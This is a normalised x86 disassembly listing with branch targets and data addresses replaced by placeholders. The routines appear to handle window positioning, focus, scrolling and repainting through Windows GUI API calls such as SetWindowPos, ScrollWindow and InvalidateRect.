mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax ebx
mov si 0xffc1
call sub_40587c
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_4715d0
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x40 ]
push 0x1
mov [ esp + 0x4 ] esi
mov eax [ esp + 0x4 ]
call sub_407134
push eax
call LoadKeyboardLayoutW
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x38 ]
push 0x1
mov [ esp + 0x4 ] esi
mov eax [ esp + 0x4 ]
call sub_407134
push eax
call LoadKeyboardLayoutW
jmp r-xdata
sub_478f00
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4767cc
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_473604
sub_478f60
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax ebx
call sub_4763e8
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_4755d4
pop ebx
retn
sub_478fb8
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
test al al
jne r-xdata
mov eax ebx
call sub_47a060
test al al
je r-xdata
cmp [ ebx + 0x34 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_4755d4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x258 ]
push eax
call EnableWindow
sub_479028
push ebx
mov ebx eax
mov eax ebx
call sub_4732f4
mov eax ebx
call sub_47a060
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_475914
pop ebx
retn
push 0x0
mov eax [ ebx + 0x64 ]
call sub_44c204
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_472314
sub_479064
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_46f174
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_479ce0
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_472314
sub_4790a4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_47a060
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_479ce0
push eax
call SetWindowPos
cmp [ esi + 0x59 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_4790e4
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_475914
pop ebx
retn
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax ebx
call sub_47a060
test al al
je r-xdata
mov eax [ ebx + 0x258 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_479be4
sub_479124
push ebx
mov ebx eax
cmp [ ebx + 0x1ed ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x34 ]
movzx edx [ eax + 0x1e9 ]
mov eax ebx
call sub_479ebc
cmp [ edx + 0x8 ] 0x0
setne al
mov edx eax
mov eax ebx
call sub_479ebc
jmp r-xdata
mov [ ebx + 0x1ed ] 0x1
sub_479164
push ebx
mov ebx eax
cmp [ ebx + 0x1ee ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
mov [ ebx + 0x1ee ] 0x1
movzx edx [ eax + 0x260 ]
mov eax ebx
call sub_478668
sub_4791cc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
movzx eax [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_471c64
jmp r-xdata
push 0x0
push 0x0
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax esi
call sub_470990
lea edx [ esp + 0x8 ]
xor ecx ecx
mov eax esi
call sub_476708
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_479254
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_473510
mov edx esi
mov eax ebx
call sub_4758a4
pop esi
pop ebx
retn
sub_479270
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
call sub_46d4a0
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
movzx eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov dl 0x1
mov eax [ esp ]
call sub_4946a4
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd8
call sub_40587c
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffa4
call sub_40587c
test al al
jne r-xdata
mov ebx [ ebx + 0x34 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x3c ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffef
call sub_40587c
test al al
jne r-xdata
sub_479308
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
movzx edx [ esi + 0x4 ]
mov eax ebx
call sub_47b010
mov edx esi
mov eax ebx
call sub_479270
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_472314
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_472314
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_472314
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov dl 0x1
mov eax ebx
call sub_4946a4
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_472314
test eax eax
jne r-xdata
jmp r-xdata
sub_4793ec
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movzx edi [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_472314
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_479440
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_472314
test al 0x80
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov dl 0x1
mov eax ebx
call sub_4946a4
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_472314
test eax eax
jne r-xdata
sub_479490
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_479270
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_472314
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov dl 0x1
mov eax ebx
call sub_4946a4
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_472314
test eax eax
jne r-xdata
sub_4794ec
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov dl 0x1
mov eax ebx
call sub_4946a4
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_472314
mov [ esi + 0xc ] eax
sub_479520
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_47a060
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_47a060
test al al
je r-xdata
mov eax [ ebx + 0x258 ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_4702b4
mov eax ebx
call sub_474070
mov eax ebx
mov edx [ eax ]
call [ edx + 0x68 ]
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x258 ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_4706f0
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x258 ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x258 ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4795fc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_475884
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_475848
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffed
call sub_40587c
inc edi
dec ebx
jne r-xdata
sub_479644
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx [ eax + 0x1bc ]
mov ebp [ ebx + 0x8 ]
test ebp ebp
jbe r-xdata
mov ebp [ ebx + 0xc ]
test ebp ebp
jbe r-xdata
push edi
push esi
push ebp
call MulDiv
mov ecx eax
xor edx edx
mov eax ebx
call sub_480384
mov ebp [ ebx + 0x10 ]
test ebp ebp
jbe r-xdata
push edi
push esi
push ebp
call MulDiv
mov ecx eax
mov edx 0x1
mov eax ebx
call sub_480384
mov ebp [ ebx + 0x14 ]
test ebp ebp
jbe r-xdata
push edi
push esi
push ebp
call MulDiv
mov ecx eax
mov edx 0x2
mov eax ebx
call sub_480384
pop ebp
pop edi
pop esi
pop ebx
retn
push edi
push esi
push ebp
call MulDiv
mov ecx eax
mov edx 0x3
mov eax ebx
call sub_480384
sub_4796c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x1ac ]
xor eax eax
push ebp
push sub_479774
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4795fc
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_470a58
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_479644
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47977b
mov eax [ ebp - 0x4 ]
call sub_47537c
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x88 ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x264 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x264 ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x268 ] eax
sub_479780
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebp ecx
mov esi edx
mov edi eax
mov eax edi
call sub_47a060
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_479ce0
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp ] al
cmp [ esp ] 0x0
je r-xdata
mov al 0x1
lea edx [ esp + 0x4 ]
mov eax edi
call sub_4706f0
mov ecx ebp
mov edx esi
mov eax edi
mov si 0xffed
call sub_40587c
mov eax [ edi + 0x48 ]
push eax
mov eax [ edi + 0x4c ]
push eax
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x98 ]
cmp [ esp ] 0x0
je r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax edi
call sub_479ce0
push eax
call SetWindowPos
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
push 0x57
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax edi
call sub_479ce0
push eax
call SetWindowPos
sub_479830
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x258 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_475884
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x258 ]
push eax
call ScrollWindow
xor edx edx
mov eax edi
call sub_4752e0
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x258 ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_475848
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x258 ]
push eax
call SetWindowPos
sub_47990c
push esi
push edi
mov esi eax
mov edi [ esi + 0x34 ]
test edi edi
je r-xdata
pop edi
pop esi
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe0 ]
sub_479928
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x1dc ]
test edx edx
je r-xdata
mov eax [ eax + 0x1e0 ]
mov edx ebx
call sub_430608
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x258 ] 0x0
je r-xdata
mov eax [ ebx + 0x34 ]
mov edx [ eax + 0x1e0 ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x34 ]
mov ebp [ eax + 0x1e0 ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x258 ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_430438
mov eax [ ebx + 0x34 ]
mov eax [ eax + 0x1e0 ]
mov ecx ebx
mov edx esi
call sub_430658
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_4305a0
call sub_479ce0
jmp r-xdata
mov eax ebp
mov edx esi
call sub_4305a0
call sub_479ce0
sub_479a00
push ebx
push esi
mov ebx [ eax + 0x34 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x258 ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x1e0 ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_479928
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x1dc ]
test esi esi
je r-xdata
sub_479a60
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_479ce0
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_479ce0
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x258 ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
test eax eax
jne r-xdata
sub_479ac4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_43caf8
mov esi eax
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx ebx
mov eax edi
call sub_43cacc
mov ecx [ ebp + 0x4 ]
mov edx 0xb056
call sub_472314
mov edx ebx
mov eax edi
call sub_43cacc
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
sub_479b18
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_47a060
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_472314
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x258 ]
push eax
call __imp_InvalidateRect
call sub_485c78
call sub_485d84
test al al
je r-xdata
mov eax ebx
call sub_475884
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_475848
mov edx [ eax ]
call [ edx + 0x90 ]
mov edx esi
mov eax ebx
call sub_475848
test [ eax + 0x52 ] 0x4
je r-xdata
sub_479be4
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_4706f0
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x34 ]
mov eax [ eax + 0x258 ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_479c1c
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov dl 0x1
mov eax ebx
call sub_4946a4
mov esi eax
test esi esi
je r-xdata
movzx eax [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x59 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
test al al
je r-xdata
mov ebx [ ebx + 0x34 ]
cmp esi ebx
jne r-xdata
sub_479c5c
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_4946a4
test eax eax
je r-xdata
cmp [ ebx + 0x1d4 ] 0x0
je r-xdata
mov edx ebx
call sub_4997b4
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_4946b4
mov eax ebx
call sub_479ce0
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_479c98
push ebx
mov ebx eax
cmp [ ebx + 0x258 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x258 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_479cbc
push esi
mov esi eax
cmp [ esi + 0x258 ] 0x0
jne r-xdata
pop esi
retn
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xa8 ]
call sub_479cbc
sub_479cf4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov [ esp ] eax
push 0x0
push esi
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_40ab90
mov eax [ esp ]
call sub_475884
mov edi eax
dec edi
test edi edi
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
mov [ esp + 0x4 ] 0x0
xor edx edx
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
cmp eax [ esi ]
jge r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx 0x1
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
cmp eax [ esi + 0x4 ]
jge r-xdata
xor edx edx
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ esi ] eax
inc [ esp + 0x4 ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
xor edx edx
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebp eax
mov edx 0x2
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
add ebp eax
cmp ebp [ esi + 0x8 ]
jle r-xdata
mov edx 0x1
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ esi + 0x4 ] eax
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_475848
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
jne r-xdata
mov edx 0x1
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebp eax
mov edx 0x3
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
add ebp eax
cmp ebp [ esi + 0xc ]
jle r-xdata
xor edx edx
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebp eax
mov edx 0x2
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
add ebp eax
mov [ esi + 0x8 ] ebp
mov edx 0x1
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebp eax
mov edx 0x3
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
add ebp eax
mov [ esi + 0xc ] ebp
sub_479e28
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_479ce0
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_479e60
push esi
mov esi eax
test [ esi + 0x1c ] 0x1
jne r-xdata
pop esi
retn
mov eax esi
call sub_47a060
test al al
je r-xdata
push 0x16
mov eax [ esi + 0x4c ]
push eax
mov eax [ esi + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_479ce0
push eax
call SetWindowPos
mov eax esi
mov edx [ eax ]
call [ edx + 0x68 ]
sub_479ef8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x34 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x1d8 ]
mov edx ebx
call sub_430608
pop esi
pop ebx
retn
sub_479f1c
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_479ef8
movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
mov ebp [ edx + 0x1d8 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
call sub_430438
mov edx edi
mov eax [ ebx + 0x34 ]
mov eax [ eax + 0x1d8 ]
mov ecx ebx
call sub_430658
sub_479f90
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1e8 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x1e8 ] bl
mov eax esi
call sub_47a060
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax esi
call sub_472314
push 0xfffffff0
mov eax [ esi + 0x258 ]
push eax
call GetWindowLongW
and eax 0xfffeffff
test bl bl
je r-xdata
push eax
push 0xfffffff0
mov eax [ esi + 0x258 ]
push eax
call SetWindowLongW
or eax 0x10000
sub_479ff0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_47a054
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1eb ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a05b
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
mov [ ebx + 0x1eb ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_40587c
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x1c8 ]
call sub_409ccc
sub_47a06c
push ebx
push esi
push edi
add esp 0xffffffbc
mov ebx eax
mov eax [ ebx + 0x258 ]
push eax
call IsIconic
test eax eax
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x258 ]
push eax
call GetWindowRect
mov [ esp + 0x18 ] 0x2c
lea eax [ esp + 0x18 ]
push eax
mov eax [ ebx + 0x258 ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x34 ]
lea edi [ esp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x10 ]
sub eax [ esp + 0x8 ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0x14 ]
sub eax [ esp + 0xc ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_4702b4
add esp 0x44
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x258 ]
push eax
call GetWindowLongW
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x258 ]
push eax
call GetWindowLongW
test eax 0x40000000
je r-xdata
push 0xffffffec
push esi
call GetWindowLongW
test eax __dos_header
je r-xdata
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
push esp
push esi
call ScreenToClient
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
push esp
push esi
call ScreenToClient
mov eax [ esp ]
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x4 ]
